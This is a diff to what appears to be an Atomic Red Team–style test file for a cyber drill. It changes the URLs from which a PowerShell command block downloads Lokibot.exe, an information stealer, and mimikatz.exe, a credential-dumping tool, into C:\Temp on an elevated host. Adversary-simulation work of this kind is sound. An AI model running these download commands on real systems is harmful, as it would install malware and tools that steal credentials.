@@ -84,11 +84,11 @@ atomic_tests:
       elevation_required: true
       command: |
         Write-Host "[*] Downloading Mimikatz using certutil..."
-        $mimikatz_url = "https://github.com/Da2dalus/The-MALWARE-Repo/blob/master/Stealer/Lokibot.exe"
+        $mimikatz_url = "https://learn.ug-cert.ug/files/8abeae9fc19ffb927c2241d8febcc23f/Lokibot.exe"
         $mimikatz_path = "C:\Temp\Lokibot.exe"
 
         Write-Host "[*] Downloading Mimikatz using certutil..."
-        $mimikatz1_url = "https://raw.githubusercontent.com/khanzjob/cyber-drill/main/mimikatz.exe"
+        $mimikatz1_url = "https://learn.ug-cert.ug/files/cc420cfbf9e476f03f4ec388247bb1df/mimikatz.exe"
         $mimikatz1_path = "C:\Temp\Mimikatz.exe"
 
         # Create the folder if it doesn't exist
@@ -247,6 +247,7 @@ atomic_tests:
     attack_technique:
       - T1070.001
       - T1070.004
+
 
 
 
